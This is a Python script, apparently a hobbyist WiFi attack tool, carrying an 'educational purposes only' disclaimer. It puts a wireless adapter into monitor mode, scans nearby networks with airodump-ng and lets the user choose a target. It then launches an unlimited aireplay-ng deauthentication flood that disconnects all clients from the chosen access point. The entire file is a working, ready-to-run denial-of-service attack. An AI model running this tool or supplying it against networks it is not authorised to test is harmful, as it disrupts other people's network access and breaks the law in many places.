import os
import subprocess
import csv
import re
import time
import shutil
from datetime import datetime

available_visible_networks = [] #empty list to store all the names(BSSID) of wifi networks

def check_for_essid(essid, lst):
    if len(lst) == 0:
        return True

    for item in lst:
        if essid in item["ESSID"]:
            return False

    return True

print(r"""
      
      
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⢬⣧⠀⠙⣆⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⠛⠉⠀⠀⠀⠈⠀⠀⠙⠉⠉⠛⠳⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣩⠀⠀⠀⠀⠀⠀⢿⣿⠛⣿⣶⣶⣤⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡼⠋⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡆⠀⠀⠀⠀⠀⠈⣿⣇⠉⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢳⠀⠀⠀⠀⠀⡄⠘⢿⣆⢨⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣠⣾⠏⠀⠀⠀⡇⠀⠀⠀⠀⠀⢠⠀⠀⢹⡀⠀⠘⣧⠀⠀⠀⠀⢹⡀⠈⢻⣷⣜⠛⡿⠀⠀⠀⠀⠀⠀⠀
⠀⣴⣿⣿⣿⠏⠀⡀⠀⠀⣷⠀⠀⠀⠀⠀⢸⡄⠀⠈⣧⠀⠀⠘⣆⠀⠀⠀⠘⡇⠀⠀⠙⡿⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⢻⣿⣿⡏⠀⠀⡇⠀⠀⢸⡄⠀⠀⠀⠀⠈⣷⣄⠀⠘⣷⡀⠀⠘⣆⠀⠀⠀⣧⠀⠀⠀⢧⠈⠻⣷⡀⠀⠀⠀⠀⠀
⠀⠈⣿⡿⠀⢰⠀⣧⠀⠀⢸⠻⣆⠀⠀⠀⠀⣷⠘⢦⡀⠘⣿⣤⡀⠹⣄⠀⠀⢹⠀⠀⠀⠘⣧⠀⠙⣷⡀⠀⠀⠀⠀
⠀⠀⢸⠇⠀⠸⢠⡿⣄⠀⢸⠀⠈⠛⠦⣤⣀⣹⣶⡶⠿⠲⠮⢯⣽⣦⣻⡀⠀⢸⠀⠀⠀⠀⢹⡆⠀⠸⣧⠀⠀⠀⠀
⠀⠀⣿⠀⠀⢀⣾⠁⠙⣦⣸⡦⠖⠉⠀⠀⠈⠉⠈⠃⠀⠀⠀⠀⠀⠀⠈⣯⠀⢸⠀⠀⠀⠀⠀⢻⠀⠀⢹⣇⠀⠀⠀
⠀⣸⡏⠀⠀⢸⠇⠀⠀⠈⠙⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣴⡶⢲⣿⠀⢸⠀⠀⠀⠀⠀⠘⡇⠀⢸⢹⣆⠀⠀
⠀⣿⣇⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡯⠿⠛⠋⠉⠉⠁⠘⡄⢸⠀⠀⠀⠀⠀⠀⢷⠀⢸⢀⣿⡄⠀
⢀⡟⢸⠀⠀⢸⡇⠀⣀⡤⣶⣾⣿⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⢀⢀⡀⣤⠀⡇⢸⠀⠀⠀⠀⠀⠀⢸⠀⢸⢸⠙⣇⠀
⢸⡇⠸⡄⠀⠘⣧⠼⠷⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠘⠋⠉⠉⠀⡇⣼⠀⠀⠀⠀⠀⠀⢸⠀⡼⣼⠀⢻⠀
⢸⡧⡀⣧⠀⠀⢿⠀⠀⢰⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠀⠀⠀⠀⠀⣧⡇⠀⠀⠀⠀⠀⠀⢸⠀⢣⠇⠀⢸⡄
⢸⡇⢧⠘⣆⠀⠸⣇⠀⠈⠀⠀⠀⣀⣀⣀⠤⠴⢒⣒⠽⠛⠁⠀⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⡜⢠⡟⠀⠀⢸⡇
⢸⡇⠈⢧⠹⡄⠀⢻⡀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⣀⡴⠆⣿⠀⠀⠀⠀⠀⠀⠀⣧⡞⠀⠀⠀⢸⠇
⠈⣧⠀⠈⢷⡹⣄⠈⠷⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⠛⢉⡤⢾⠃⠀⠀⠀⠀⠀⠀⢸⠏⠀⠀⠀⠀⣼⠀
⠀⠹⣆⠀⢀⠳⡌⢢⡀⠀⠈⠉⣹⠙⠛⣚⠛⣟⡛⠻⣿⠟⢁⡤⠞⠉⠀⡟⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⣼⠃⠀
⠀⠀⢻⡄⢸⡄⠙⢦⡀⠀⠀⠀⢸⣆⠀⠈⠳⣄⡙⢲⣽⠞⠉⠀⠀⢀⣼⠃⠀⠀⠀⠀⢀⣤⠞⠃⠀⠀⣠⡾⠋⠀⠀
⠀⠀⠀⠹⣦⣿⣦⡀⠙⠳⢤⣀⡘⣿⠛⠶⢤⣤⣉⣟⠁⠀⠀⣠⣾⣿⡏⠀⠀⢀⣠⣶⣿⣧⠤⠤⠶⠛⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢻⣦⡙⠳⠦⢤⣄⣁⣹⣆⠀⠀⠀⡼⣻⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀

      
      
      """)

print("\n************************************************************************************************************")
print("\n* Copyright of Happy-kitty                                                                                 *")
print("\n* for educational purposes only                                                                            *")
print("\n* I will not be held responsible if you are caught using this script for malicious intents                 *")
print("\n* Do not use against any network that you don't own or have authorization to test.                         *")
print("\n************************************************************************************************************")

if not 'SUDO_UID' in os.environ.keys():
    print("You need to be a superuser to run this script")
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        print("There shouldn't be any .csv files in your directory. Moving them to the backup directory.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except FileExistsError:
            print("Backup folder exists.")

        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("^wlan[0-9]+")
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(check_wifi_result) == 0:
    print("Please connect a WiFi adapter and try again.")
    exit()

print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices available.")

hacknic = check_wifi_result[int(wifi_interface_choice)]
print("WiFi adapter connected!\nNow let's kill conflicting processes:")
subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print("Putting Wifi adapter into monitored mode:")
subprocess.run(["sudo", "airmon-ng", "start", hacknic])

subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            if ".csv" in file_name:
                with open(file_name) as csv_file:
                    csv_file.seek(0)
                    csv_reader = csv.DictReader(csv_file, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID":
                            pass
                        elif row["BSSID"] == "Station MAC":
                            break
                        elif check_for_essid(row["ESSID"], available_visible_networks):
                            available_visible_networks.append(row)

        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(available_visible_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make a choice.")

while True:
    choice = input("Please select a choice from above: ")
    try:
        if available_visible_networks[int(choice)]:
            break
    except:
        print("Please try again.")

hackbssid = available_visible_networks[int(choice)]["BSSID"]
hackchannel = available_visible_networks[int(choice)]["channel"].strip()

subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])

